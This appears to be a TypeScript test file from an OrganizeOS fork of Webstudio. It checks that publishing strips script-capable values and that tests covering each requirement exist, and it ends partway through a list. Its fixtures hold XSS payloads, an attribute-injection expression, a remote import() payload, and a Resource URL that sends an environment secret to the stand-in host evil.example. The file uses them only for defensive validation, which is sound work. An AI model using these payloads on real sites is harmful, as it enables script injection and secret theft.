import { existsSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, expect, test } from "vitest";
import { parse } from "acorn";
import { transformWithEsbuild } from "vite";
import {
  bundleVersion,
  publishedProjectBundle,
  type PublishedProjectBundle,
} from "@webstudio-is/protocol";
import {
  ROOT_INSTANCE_ID,
  createScope,
  encodeDataSourceVariable,
  generateResources,
  type DataSource,
  type Instance,
  type Prop,
  type Resource,
} from "@webstudio-is/sdk";
import { generateWebstudioComponent } from "@webstudio-is/react-sdk";
import {
  ORGANIZEOS_GUARD_LEVEL,
  checkCustomCodeNames,
  findPausedExpressions,
  orgEmbedsMayShip,
  orgScriptMayRun,
  templateIconCodes,
} from "@organizeos/site-components/org-script";
import { dropOrgScript } from "./organizeos-org-script";
import {
  checkAction,
  checkElementTag,
  checkResourceName,
  checkValueExpression,
} from "@organizeos/site-components/org-script";
import { migratePages } from "@webstudio-is/project-migrations/pages";
import {
  assertBuildCodeValid,
  assertCustomCodeNamesValid,
} from "./organizeos-code-check";
import { pageCarriesOrgCode } from "./organizeos-publish-facts";
import { findGeneratedCodeProblems } from "./organizeos-generated-code";

// The publish workflow sends ORGANIZEOS_GUARD_LEVEL to OrganizeOS as
// guardLevel, and OrganizeOS launches a Website only from a build whose level
// is high enough (docs/ORGANIZEOS-FORK.md section 5). So the level this commit
// reports must be one its CLI meets. Each requirement of a level has a check
// that runs here and the tests that cover it fully, which must still exist and
// run: neither commented out nor skipped. Level 2 (a build that carries org
// code may go live, spec 2026-11-20-builder-code-embeds-design.md, 4.5) is
// defined and checked here while the level stays 1.

const root = fileURLToPath(new URL("../../..", import.meta.url));

/**
 * A test that covers a requirement: the titles from an enclosing describe to
 * the describe or test itself (any describes between them may be left out),
 * in a file named from the repository root.
 */
type Covering = { file: string; path: string[] };

type Requirement = {
  name: string;
  /** Whether the CLI built from this commit meets it. */
  holds: () => boolean | Promise<boolean>;
  coveredBy: Covering[];
};

const instance = (
  id: string,
  component: string,
  init: Partial<Instance> = {}
): [string, Instance] => [
  id,
  { type: "instance", id, component, children: [], ...init },
];

const prop = (
  instanceId: string,
  name: string,
  value: string
): [string, Prop] => {
  const id = `${instanceId}:${name}`;
  return [id, { id, instanceId, name, type: "string", value }];
};

const children = (...ids: string[]): Instance["children"] =>
  ids.map((value) => ({ type: "id", value }));

/** A home page that redirects to `redirect`, with these instances under it. */
const bundleOf = ({
  instances,
  props,
  redirect,
  dataSources = [],
  resources = [],
}: {
  instances: Array<[string, Instance]>;
  props: Array<[string, Prop]>;
  redirect?: string;
  dataSources?: Array<[string, DataSource]>;
  resources?: Array<[string, Resource]>;
}): PublishedProjectBundle => {
  const home = {
    id: "home",
    name: "Home",
    title: `"Home"`,
    path: "",
    rootInstanceId: "root",
    meta: redirect === undefined ? {} : { redirect, status: "302" as const },
  };
  return publishedProjectBundle.parse({
    bundleVersion,
    origin: "https://assets.example",
    projectDomain: "example.com",
    projectTitle: "Example",
    page: home,
    pages: [home],
    assets: [],
    build: {
      id: "build-id",
      projectId: "project-id",
      version: 1,
      createdAt: "2024-01-01T00:00:00.000Z",
      updatedAt: "2024-01-02T00:00:00.000Z",
      pages: {
        meta: { siteName: "Site" },
        homePageId: "home",
        rootFolderId: "root-folder",
        pages: [home],
        folders: [
          { id: "root-folder", name: "Root", slug: "", children: ["home"] },
        ],
      },
      props,
      instances,
      dataSources,
      resources,
      styleSources: [],
      styleSourceSelections: [],
      styles: [],
      breakpoints: [],
    },
  });
};

const propIds = (bundle: PublishedProjectBundle) =>
  bundle.build.props.map(([id]) => id);

const instanceIds = (bundle: PublishedProjectBundle) =>
  bundle.build.instances.map(([id]) => id);

const unsafeValuesLeftOut = () => {
  const published = dropOrgScript(
    bundleOf({
      instances: [
        instance("root", "Body", { children: children("link", "frame") }),
        instance("link", "Link"),
        instance("frame", "ws:element", { tag: "iframe" }),
      ],
      props: [
        prop("link", "href", "javascript:alert(1)"),
        prop("link", "id", "link"),
        prop("frame", "src", "data:text/html,<script>alert(1)</script>"),
        prop("frame", "srcdoc", "<script>alert(1)</script>"),
      ],
      redirect: '"javascript:alert(1)"',
    })
  );
  return (
    JSON.stringify(propIds(published)) === JSON.stringify(["link:id"]) &&
    published.build.pages.pages[0].meta.redirect === undefined
  );
};

const xmlTemplate = readFileSync(
  `${root}packages/cli/templates/react-router/app/route-templates/xml.tsx`,
  "utf8"
);

const xmlElementsAndHandlersLeftOut = () => {
  const published = dropOrgScript(
    bundleOf({
      instances: [
        instance("root", "Body", { children: children("node", "box") }),
        instance("node", "XmlNode"),
        instance("box", "ws:element", { tag: "div" }),
      ],
      props: [prop("node", "tag", "x"), prop("box", "onclick", "alert(1)")],
    })
  );
  return (
    JSON.stringify(instanceIds(published)) ===
      JSON.stringify(["root", "box"]) && propIds(published).length === 0
  );
};

// Fixed samples: one refused value per kind, and values the editors write.
const inputValidationHolds = () => {
  const refusedExpressions = ["a()", "1; 2", "1 // a", '"a".constructor'];
  const acceptedExpressions = [
    '"a"',
    "$ws$dataSource$a.slice(1) + `b ${$ws$system.params.c}`",
  ];
  const valuesHold =
    refusedExpressions.every(
      (expression) => checkValueExpression(expression).ok === false
    ) &&
    acceptedExpressions.every(
      (expression) => checkValueExpression(expression).ok
    ) &&
    checkAction([{ args: [], code: "a = 1" }]).ok === false &&
    checkAction([{ args: ["a)"], code: "$ws$dataSource$a = 1" }]).ok ===
      false &&
    checkAction([{ args: ["v"], code: "$ws$dataSource$a = v" }]).ok &&
    checkResourceName("header", "a b").ok === false &&
    checkResourceName("searchParam", 'a"').ok === false &&
    checkElementTag("script").ok === false &&
    checkElementTag("div").ok;
  const prebuildRefuses = (bundle: PublishedProjectBundle) => {
    try {
      assertBuildCodeValid(bundle.build, migratePages(bundle.build.pages));
      return false;
    } catch {
      return true;
    }
  };
  const withTag = (tag: string) =>
    bundleOf({
      instances: [
        instance("root", "Body", { children: children("node") }),
        instance("node", "ws:element", { tag }),
      ],
      props: [],
    });
  return (
    valuesHold &&
    prebuildRefuses(withTag("script")) &&
    prebuildRefuses(
      bundleOf({
        instances: [instance("root", "Body")],
        props: [],
        redirect: "a()",
      })
    ) &&
    prebuildRefuses(
      bundleOf({
        instances: [instance("root", "Body")],
        props: [],
        resources: [
          [
            "contact",
            {
              id: "contact",
              name: "Contact",
              control: "email",
              method: "post",
              url: `""`,
              headers: [],
              email: { subject: '"a".constructor' },
            },
          ],
        ],
      })
    ) &&
    prebuildRefuses(withTag("div")) === false
  );
};

const codeCheckTests =
  "packages/sdk-components-organizeos/src/code-check.test.ts";

// A prop and a Resource that may not ship. The modules generated from what
// ships hold neither, and read no name they do not declare.
const expressionsLeftOut = async () => {
  // a Collection's item named like a global, which a Resource may not name
  const named = encodeDataSourceVariable("first-ds");
  const published = dropOrgScript(
    bundleOf({
      instances: [
        instance("root", "Body", { children: children("box", "list") }),
        instance("box", "Box"),
        instance("list", "ws:collection", { children: children("inner") }),
        instance("inner", "Box"),
      ],
      props: [
        [
          "box:title",
          {
            id: "box:title",
            instanceId: "box",
            name: "title",
            type: "expression",
            value: '"x"} data-x={globalThis.pwned = 1',
          },
        ],
        [
          "list:data",
          {
            id: "list:data",
            instanceId: "list",
            name: "data",
            type: "expression",
            value: "[1]",
          },
        ],
        [
          "list:item",
          {
            id: "list:item",
            instanceId: "list",
            name: "item",
            type: "parameter",
            value: "first-ds",
          },
        ],
      ],
      dataSources: [
        [
          "first-ds",
          {
            type: "parameter",
            id: "first-ds",
            name: "process",
            scopeInstanceId: "list",
          },
        ],
        [
          "leak-ds",
          {
            type: "resource",
            id: "leak-ds",
            name: "leak",
            scopeInstanceId: "root",
            resourceId: "leak",
          },
        ],
      ],
      resources: [
        [
          "leak",
          {
            id: "leak",
            name: "leak",
            method: "get",
            url: `"https://evil.example/?k=" + ${named}.env.PROBE_SECRET`,
            headers: [],
          },
        ],
      ],
    })
  );
  const { build } = published;
  const [page] = build.pages.pages;
  const instances = new Map(build.instances);
  const props = new Map(build.props);
  const dataSources = new Map(build.dataSources);
  const scope = createScope();
  const modules =
    generateWebstudioComponent({
      scope,
      name: "Page",
      rootInstanceId: page.rootInstanceId,
      parameters: [],
      instances,
      props,
      dataSources,
      metas: new Map(),
      classesMap: new Map(),
    }) +
    generateResources({
      scope,
      page,
      dataSources,
      props,
      resources: new Map(build.resources),
    });
  // the page's components, which prebuild imports
  const imports = [
    'import { Fragment } from "react";',
    'import { Body, Box } from "@webstudio-is/sdk-components-react";',
  ].join("\n");
  return (
    modules.includes("pwned") === false &&
    modules.includes("PROBE_SECRET") === false &&
    JSON.stringify(
      await findGeneratedCodeProblems(`${imports}\n${modules}`)
    ) === JSON.stringify({ undeclared: [], shadowed: [], forbidden: [] }) &&
    findPausedExpressions({
      pages: build.pages.pages,
      instances,
      props: props.values(),
      dataSources,
      resources: new Map(build.resources),
    }).length === 0
  );
};

// An action that reads a member of its argument, one that reads a member of
// a variable and one that calls a variable are left out, and one that sets a
// variable to a plain value stays.
const actionsLeftOut = async () => {
  const variable = encodeDataSourceVariable("v");
  const onClick = (
    instanceId: string,
    args: string[],
    code: string
  ): [string, Prop] => {
    const id = `${instanceId}:onClick`;
    return [
      id,
      {
        id,
        instanceId,
        name: "onClick",
        type: "action",
        value: [{ type: "execute", args, code }],
      },
    ];
  };
  const published = dropOrgScript(
    bundleOf({
      instances: [
        instance("root", "Body", {
          children: children("reads", "member", "call", "sets"),
        }),
        instance("reads", "Box"),
        instance("member", "Box"),
        instance("call", "Box"),
        instance("sets", "Box"),
      ],
      props: [
        onClick("reads", ["event"], `${variable} = event.target.value`),
        onClick("member", [], `${variable} = ${variable}.length`),
        onClick("call", [], `${variable} = ${variable}()`),
        onClick("sets", [], `${variable} = 1`),
      ],
      dataSources: [
        [
          "v",
          {
            type: "variable",
            id: "v",
            name: "v",
            scopeInstanceId: "root",
            value: { type: "number", value: 0 },
          },
        ],
      ],
    })
  );
  return (
    JSON.stringify(propIds(published)) === JSON.stringify(["sets:onClick"])
  );
};

// One of each kind the page module cannot ship while org script is paused:
// an HTML Embed holding a script, a Markdown Embed, a JSON-LD element, an
// instance of a component the page does not import, an instance stored with
// the global root's id, a data source whose id the module uses for something
// else, a parameter named ref, raw markup, and the site's custom code. Each is
// left out, and a plain element and a plain variable stay.
/**
 * The sample of what publishing leaves out, through dropOrgScript with the
 * embed switch given: the five embed kinds (HTML Embed, Markdown Embed,
 * JSON-LD and the custom code in both homes) beside raw markup, an unknown
 * component, the global root's id and an element reference.
 */
const unshippableSample = (embedsMayShip: boolean) => {
  const parameter = (
    instanceId: string,
    name: string,
    value: string
  ): [string, Prop] => {
    const id = `${instanceId}:${name}`;
    return [id, { id, instanceId, name, type: "parameter", value }];
  };
  const variable = (id: string): [string, DataSource] => [
    id,
    {
      type: "variable",
      id,
      name: "v",
      scopeInstanceId: "root",
      value: { type: "string", value: "" },
    },
  ];
  const code = "<script>1</script>";
  const bundle = bundleOf({
    instances: [
      instance("root", "Body", {
        children: children(
          "embed",
          "markdown",
          "json",
          "unknown",
          ROOT_INSTANCE_ID,
          "box"
        ),
      }),
      instance("embed", "HtmlEmbed"),
      instance("markdown", "MarkdownEmbed"),
      instance("json", "JsonLd"),
      instance("unknown", "x:script"),
      instance(ROOT_INSTANCE_ID, "Box"),
      instance("box", "Box"),
    ],
    props: [
      prop("embed", "code", code),
      prop("markdown", "code", "a"),
      prop("json", "code", "{}"),
      prop("box", "id", "box"),
      prop("box", "dangerouslySetInnerHTML", "<b>1</b>"),
      parameter("box", "ref", "held"),
      parameter("box", "title", "Box"),
    ],
    dataSources: [variable("held"), variable("Box")],
  });
  const published = dropOrgScript(
    {
      ...bundle,
      build: {
        ...bundle.build,
        pages: {
          ...bundle.build.pages,
          meta: { ...bundle.build.pages.meta, code },
        },
        projectSettings: { meta: { siteName: "Site", code }, compiler: {} },
      },
    },
    { embedsMayShip }
  );
  return { published, code };
};

/** Level 1: with the switch given, the embeds and custom code are left out. */
const unshippableLeftOut = (embedsMayShip: boolean) => {
  const { published } = unshippableSample(embedsMayShip);
  return (
    JSON.stringify(instanceIds(published)) ===
      JSON.stringify(["root", "box"]) &&
    JSON.stringify(propIds(published)) === JSON.stringify(["box:id"]) &&
    JSON.stringify(published.build.dataSources.map(([id]) => id)) ===
      JSON.stringify(["held"]) &&
    published.build.pages.meta?.code === undefined &&
    published.build.projectSettings?.meta.code === undefined
  );
};

/**
 * Level 2, with embeds on: raw markup, the unknown component, the global
 * root's id and the element reference are left out, and the five embed kinds
 * are kept.
 */
const unshippableLeftOutKeepingEmbeds = () => {
  const { published, code } = unshippableSample(true);
  return (
    JSON.stringify(instanceIds(published)) ===
      JSON.stringify(["root", "embed", "markdown", "json", "box"]) &&
    JSON.stringify(propIds(published)) ===
      JSON.stringify(["embed:code", "markdown:code", "json:code", "box:id"]) &&
    JSON.stringify(published.build.dataSources.map(([id]) => id)) ===
      JSON.stringify(["held"]) &&
    published.build.pages.meta?.code === code &&
    published.build.projectSettings?.meta.code === code
  );
};

// The reviewer's payload (spec 2026-11-20, 4.4)
const reviewerPayload = '<div async/ ={import("https://x.example/a.js")}>';

const factsTellTheTruth = () => {
  const sample = (code: string) =>
    pageCarriesOrgCode({
      rootInstanceId: "root",
      instances: new Map([
        instance("root", "Body", { children: children("embed") }),
        instance("embed", "HtmlEmbed"),
      ]),
      props: new Map([prop("embed", "code", code)]),
    });
  const icon = [...templateIconCodes][0];
  return sample("<script>1</script>") === true && sample(icon) === false;
};

const customCodeNamesChecked = () => {
  if (checkCustomCodeNames(reviewerPayload).ok !== false) {
    return false;
  }
  try {
    assertCustomCodeNamesValid(reviewerPayload);
    return false;
  } catch {
    return true;
  }
};

const moduleCheckRefusesForbidden = async () => {
  const found = await Promise.all(
    [
      'export const P = () => import("https://x.example/a.js");',
      "export const P = () => import.meta.url;",
      "export const P = function () { return this; };",
    ].map(async (code) => (await findGeneratedCodeProblems(code)).forbidden)
  );
  return (
    JSON.stringify(found) ===
    JSON.stringify([["import()"], ["import.meta"], ["this"]])
  );
};

const insertionPathExists = () => {
  const builder = JSON.parse(
    readFileSync(`${root}apps/builder/package.json`, "utf8")
  ) as { dependencies?: Record<string, string> };
  return (
    /^\d+\.\d+\.\d+$/.test(builder.dependencies?.dompurify ?? "") &&
    existsSync(`${root}apps/builder/app/shared/organizeos-untrusted-markup.tsx`)
  );
};

const unsafeValuesTests =
  "packages/cli/src/organizeos-org-script.unsafe-values.test.ts";
const prebuildTests = "packages/cli/src/prebuild.test.ts";

const workflowTests = "packages/cli/src/organizeos-publish-workflow.test.ts";
const unsafeValues = "dropOrgScript leaves unsafe values out";
const leftOutExpressions = "dropOrgScript leaves expressions out";
const orgScriptTests = "packages/cli/src/organizeos-org-script.test.ts";
const prebuildOwnScript = ["prebuild", "leaves an org's own script out"];
const prebuildExpressions = [
  ...prebuildOwnScript,
  "expressions, Resources and page settings",
];
const prebuildUnsafeValues = ["prebuild", "leaves unsafe values out"];

const embedsRequirementName =
  "embeds, raw markup, custom code, element references, and instances and data sources the page module cannot ship are left out";
const embedsOffName = "orgEmbedsMayShip() is false";

const levelOne: Requirement[] = [
  {
    name: embedsOffName,
    holds: () => orgEmbedsMayShip() === false,
    coveredBy: [
      {
        file: "packages/sdk-components-organizeos/src/org-script.test.ts",
        path: ["orgEmbedsMayShip", "is off"],
      },
    ],
  },
  {
    name: "the org script switch is off",
    holds: () => orgScriptMayRun() === false,
    coveredBy: [
      {
        file: "packages/sdk-components-organizeos/src/org-script.test.ts",
        path: ["orgScriptMayRun", "is off"],
      },
      {
        file: workflowTests,
        path: [
          "the publish workflow's org script switch",
          "the step's command prints false from the built package",
        ],
      },
    ],
  },
  {
    name: "unsafe addresses, srcdoc and unsafe redirects are left out",
    holds: unsafeValuesLeftOut,
    coveredBy: [
      {
        file: unsafeValuesTests,
        path: [
          unsafeValues,
          "drops unsafe static addresses and keeps the instance and its other props",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          unsafeValues,
          "drops a bound address that decides nothing, and keeps one whose fixed start decides",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          unsafeValues,
          "drops srcdoc and every on… prop that is not an action, and keeps an action",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          unsafeValues,
          "drops a page redirect to an unsafe target with its 3xx status, on the home page, and keeps a 404 status",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          unsafeValues,
          "drops a project redirect to an unsafe target and keeps the others in order",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildUnsafeValues,
          "drops javascript: and data: addresses from links, sources, forms and objects",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildUnsafeValues,
          "drops a page redirect and a project redirect to an unsafe target",
        ],
      },
    ],
  },
  {
    name: "XML pages answer sandboxed",
    holds: () =>
      xmlTemplate.includes('"Content-Security-Policy": "sandbox"') &&
      xmlTemplate.includes('"X-Content-Type-Options": "nosniff"'),
    coveredBy: [
      {
        file: prebuildTests,
        path: [
          ...prebuildUnsafeValues,
          "an XML page answers with a sandbox policy and nosniff",
        ],
      },
    ],
  },
  {
    name: "XML elements are left out of HTML pages, and on… props that are not actions are dropped",
    holds: xmlElementsAndHandlersLeftOut,
    coveredBy: [
      {
        file: unsafeValuesTests,
        path: [
          unsafeValues,
          "drops an XML Node from an HTML page with its subtree and its scoped data, and keeps it on an XML page",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          unsafeValues,
          "drops srcdoc and every on… prop that is not an action, and keeps an action",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildUnsafeValues,
          "leaves an XML Node out of an HTML page and keeps it on an XML page",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildUnsafeValues,
          "drops srcdoc and event handler attributes",
        ],
      },
      {
        file: "packages/project-build/src/runtime/project-settings.organizeos.test.ts",
        path: ["the redirect operations refuse the target %s"],
      },
    ],
  },
  {
    name: "expressions, actions and generated names pass input validation before they are compiled or published",
    holds: inputValidationHolds,
    coveredBy: [
      { file: codeCheckTests, path: ["checkValueExpression", "refuses %s"] },
      {
        file: codeCheckTests,
        path: ["checkValueExpression", "refuses comments"],
      },
      {
        file: codeCheckTests,
        path: [
          "checkValueExpression",
          "refuses the property %s in both access forms and as a key",
        ],
      },
      {
        file: codeCheckTests,
        path: [
          "checkAction",
          "refuses an assignment to anything but a variable",
        ],
      },
      {
        file: codeCheckTests,
        path: ["checkResourceName", "a header name is token characters only"],
      },
      {
        file: codeCheckTests,
        path: [
          "checkElementTag",
          "accepts every tag the builder offers and nothing else",
        ],
      },
      {
        file: codeCheckTests,
        path: ["the fork's own values pass", "the %s site template"],
      },
      {
        file: codeCheckTests,
        path: [
          "findCodeCheckFailure",
          "reads every field of the Resource schema that holds an expression",
        ],
      },
      {
        file: "packages/cli/src/organizeos-code-check.test.ts",
        path: ["assertBuildCodeValid", "names an email resource's %s"],
      },
      {
        file: "packages/cli/src/organizeos-code-check.test.ts",
        path: [
          "assertBuildCodeValid",
          "runs with the switch on, after a drop that keeps everything",
        ],
      },
      {
        file: prebuildTests,
        path: [
          "prebuild",
          "stops a build with a value that fails input validation",
          "%s",
        ],
      },
      {
        file: "packages/project-build/src/runtime/data.organizeos.test.ts",
        path: [
          "an expression that fails input validation reads as unset and is never compiled",
        ],
      },
      {
        file: "apps/builder/app/shared/nano-states/props.organizeos.test.ts",
        path: ["an action with %s does nothing and is never compiled"],
      },
      {
        file: "apps/builder/app/canvas/organizeos-org-script.test.tsx",
        path: [
          "instanceTagMayRender",
          "a tag the builder does not offer never renders, whatever the switch",
        ],
      },
      {
        file: "apps/builder/app/shared/sync/patch/patch-service.server.test.ts",
        path: [
          "applyPatchRequest with a value that fails input validation",
          "fails the entry that writes it, with the reason, and applies the others",
        ],
      },
      {
        file: "apps/builder/app/services/api-router.server.test.ts",
        path: [
          "api router permits",
          "a build patch with a value that fails input validation is not saved",
        ],
      },
      {
        file: "apps/builder/app/services/api-router.server.test.ts",
        path: [
          "api router permits",
          "a runtime operation that writes a value failing input validation is not saved",
        ],
      },
      {
        file: "apps/builder/app/services/build-router.server.test.ts",
        path: [
          "build router restore points",
          "a restore point with a value that fails input validation is not restored",
        ],
      },
    ],
  },
  {
    name: "expressions, Resources and page settings that could run script are left out",
    holds: expressionsLeftOut,
    coveredBy: [
      {
        file: "packages/sdk-components-organizeos/src/org-script.test.ts",
        path: [
          "findPausedExpressions",
          "pauses a name the page module does not declare where it is written, and keeps it inside its Collection",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          leftOutExpressions,
          "drops an expression that may not run where it is written, an XML page's included, and counts it",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          leftOutExpressions,
          "writes undefined for a text child that may not run, and keeps the other children in place",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          leftOutExpressions,
          "drops a page setting that may not run: the title becomes empty, the redirect goes with its 3xx status, and so does a custom entry",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          leftOutExpressions,
          "drops a Resource that may not run with its data sources and the resource props that name it, and counts it",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildExpressions,
          "leaves out every expression and page setting that could run script, and every name the module does not declare where it is written",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildExpressions,
          "leaves out every Resource that could run script, and keeps one whose every part may run, one that reads another Resource's data among them",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildExpressions,
          "reads each page as prebuild publishes it: fixtures, block templates, site templates and the registry's templates",
        ],
      },
      // D7: a build that would materialize MDX is refused, and one it lets
      // through publishes no Content Block content
      {
        file: "packages/cli/src/organizeos-org-script.test.ts",
        path: [
          "refuseMdxWhilePaused",
          "reads as Markdown every asset prebuild would materialize",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildExpressions,
          "publishes no Content Block content from a build it lets through",
        ],
      },
      // the builder's server computes a form's draft
      {
        file: "packages/project-build/src/runtime/data.organizeos.test.ts",
        path: [
          "while org script is paused",
          "a form's draft compiles no field the pause refuses, and refuses it",
        ],
      },
      // what ships declares every name it reads, or the publish fails
      {
        file: "packages/cli/src/organizeos-generated-code.test.ts",
        path: [
          "checkGeneratedModule",
          "fails while org script is paused, naming the module and the names",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildExpressions,
          "checks every page and server module it generates, and a module that may not ship fails the publish",
        ],
      },
    ],
  },
  {
    name: embedsRequirementName,
    holds: () => unshippableLeftOut(orgEmbedsMayShip()),
    coveredBy: [
      {
        file: orgScriptTests,
        path: [
          "dropOrgScript",
          "drops a script embed with its descendants, props, scoped data and the parent's reference",
        ],
      },
      {
        file: orgScriptTests,
        path: [
          "dropOrgScript",
          "drops a Markdown Embed with a javascript: link, whatever its code, with its subtree",
        ],
      },
      {
        file: orgScriptTests,
        path: ["dropOrgScript", "drops a JSON-LD element and counts it"],
      },
      {
        file: orgScriptTests,
        path: [
          "raw HTML in the runtime packages",
          "publishing leaves out each component that uses it",
        ],
      },
      {
        file: orgScriptTests,
        path: [
          "dropOrgScript",
          "drops the dangerouslySetInnerHTML prop of any instance, whatever its type, and keeps the instance",
        ],
      },
      {
        file: orgScriptTests,
        path: [
          "dropOrgScript",
          "clears the custom code in the project's settings too, and keeps the rest of them",
        ],
      },
      {
        file: "packages/sdk-components-organizeos/src/org-script.test.ts",
        path: [
          "componentMayShip",
          "is false for any other, the builder's global root included",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          unsafeValues,
          "drops an instance whose component the published page does not import, with what is inside it, counts it, and keeps the registered ones",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          unsafeValues,
          "keeps the global data sources, and leaves out an instance stored with the global root's id",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          unsafeValues,
          "drops a data source whose id the page module uses for something else when nothing else is left out, and counts it",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          unsafeValues,
          "drops a parameter or an expression named ref, counts it, and keeps one of another type",
        ],
      },
      {
        file: prebuildTests,
        path: [...prebuildOwnScript, "leaves out HTML Embeds and custom code"],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildOwnScript,
          "leaves out Markdown Embeds and the SVG animate and set elements",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildOwnScript,
          "a dangerouslySetInnerHTML prop ships no markup, and its element stays",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildOwnScript,
          "the org script in projectSettings is dropped and reported",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildOwnScript,
          "leaves out an instance whose component the page does not import",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildOwnScript,
          "keeps the global data sources when it leaves out an instance stored with the global root's id",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildOwnScript,
          "leaves out a data source whose id the page module uses for something else, and what names it reads nothing",
        ],
      },
      {
        file: prebuildTests,
        path: [
          ...prebuildOwnScript,
          "leaves out a parameter or an expression named ref, so no ref names a data source",
        ],
      },
    ],
  },
  {
    name: "actions that could run script or reach a host object are left out",
    holds: actionsLeftOut,
    coveredBy: [
      {
        file: "packages/sdk-components-organizeos/src/org-script.test.ts",
        path: [
          "actionMayRun",
          "refuses member access and calls, however they are written",
        ],
      },
      {
        file: unsafeValuesTests,
        path: [
          "dropOrgScript leaves unsafe values out",
          "drops an action that could run script or reach the page, on any prop of any instance, an XML page's included, and counts it as an unsafe action",
        ],
      },
      {
        file: prebuildTests,
        path: [
          "prebuild",
          "leaves out an action that could run script or reach the page, and keeps one a template writes",
        ],
      },
      {
        file: "apps/builder/app/canvas/organizeos-org-script.props.test.tsx",
        path: [
          "the canvas computes an action",
          "runs none of the refused actions, and gives them no handler that does anything",
        ],
      },
    ],
  },
];

const insertionPathTests =
  "apps/builder/app/shared/organizeos-untrusted-markup.test.tsx";
const canvasTests = "apps/builder/app/canvas/organizeos-org-script.test.tsx";
const factsTests = "packages/cli/src/organizeos-publish-facts.test.ts";

/**
 * Level 2: every level-1 requirement but the two that keep embeds off, a
 * reworded one that leaves out raw markup and the rest and ships the five
 * embed kinds exactly when orgEmbedsMayShip(), and four new ones.
 */
const levelTwo: Requirement[] = [
  ...levelOne.filter(
    (requirement) =>
      requirement.name !== embedsOffName &&
      requirement.name !== embedsRequirementName
  ),
  {
    name: "raw markup, element references, and instances and data sources the page module cannot ship are left out; embeds and custom code ship exactly when orgEmbedsMayShip()",
    holds: () =>
      orgEmbedsMayShip()
        ? unshippableLeftOutKeepingEmbeds()
        : unshippableLeftOut(false),
    coveredBy: [
      ...(levelOne.find(
        (requirement) => requirement.name === embedsRequirementName
      )?.coveredBy ?? []),
      {
        file: orgScriptTests,
        path: [
          "dropOrgScript with embeds on",
          "keeps a script embed, a bound embed, a Markdown Embed, JSON-LD and the custom code",
        ],
      },
      {
        file: orgScriptTests,
        path: [
          "dropOrgScript with embeds on",
          "drops an embed with no code, a blank one, and one whose code the expression rules drop",
        ],
      },
      {
        file: orgScriptTests,
        path: [
          "dropOrgScript with embeds on",
          "still drops one sample of every other kind",
        ],
      },
      {
        file: orgScriptTests,
        path: [
          "raw HTML in the runtime packages",
          "JSON-LD's value cannot close its script element in the published markup",
        ],
      },
    ],
  },
  {
    name: "the publish facts tell the truth for a build with and without an embed",
    holds: factsTellTheTruth,
    coveredBy: [
      { file: factsTests, path: ["pageCarriesOrgCode", "a script embed"] },
      { file: factsTests, path: ["pageCarriesOrgCode", "icons only"] },
      {
        file: factsTests,
        path: [
          "pageCarriesOrgCode",
          "the empty HTML Embed in a Content Block's templates",
        ],
      },
      {
        file: prebuildTests,
        path: [
          "the publish facts",
          "a build with a script embed carries org code",
        ],
      },
      {
        file: prebuildTests,
        path: [
          "the publish facts",
          "the tripwire fails the build when the fact is forced false",
        ],
      },
      {
        file: workflowTests,
        path: [
          "the publish workflow's org script switch",
          "fails on orgScript true while embeds may not ship",
        ],
      },
    ],
  },
  {
    name: "custom code with a name JSX cannot hold fails the build",
    holds: customCodeNamesChecked,
    coveredBy: [
      {
        file: "packages/sdk-components-organizeos/src/custom-code-names.test.ts",
        path: ["checkCustomCodeNames", "refuses %s"],
      },
      {
        file: "packages/cli/src/html-to-jsx.organizeos.test.ts",
        path: [
          "htmlToJsx with custom code the name check accepts",
          "htmlToJsx writes only literal JSX for %s",
        ],
      },
      {
        file: prebuildTests,
        path: [
          "the custom code name check",
          "custom code with a name JSX cannot hold fails the publish at emission, naming Custom code",
        ],
      },
      {
        file: "apps/builder/app/builder/features/publish/organizeos-publish.test.tsx",
        path: [
          "the Publish dialog with a value that fails input validation",
          "with embeds on, custom code with a name JSX cannot hold does not dispatch, and is named",
        ],
      },
    ],
  },
  {
    name: "the module check refuses import(), import.meta and this",
    holds: moduleCheckRefusesForbidden,
    coveredBy: [
      {
        file: "packages/cli/src/organizeos-generated-code.test.ts",
        path: ["the forbidden constructs", "refuses a module that uses %s"],
      },
    ],
  },
  {
    name: "the builder's insertion path for untrusted markup exists, pinned, and its tests run",
    holds: insertionPathExists,
    coveredBy: [
      {
        file: insertionPathTests,
        path: ["insertUntrustedMarkup", "%s leaves nothing that runs"],
      },
      {
        file: insertionPathTests,
        path: [
          "untrustedMarkupConfig",
          "the configuration is the reviewed allowlist",
        ],
      },
      {
        file: insertionPathTests,
        path: ["UntrustedMarkup", "re-inserts only when its markup changes"],
      },
      {
        file: canvasTests,
        path: [
          "CanvasHtmlEmbed once embeds may ship",
          "%s leaves the document inert",
        ],
      },
      {
        file: canvasTests,
        path: [
          "CanvasMarkdownEmbed once embeds may ship",
          "a javascript: link, a raw iframe and a handler leave the document inert",
        ],
      },
      {
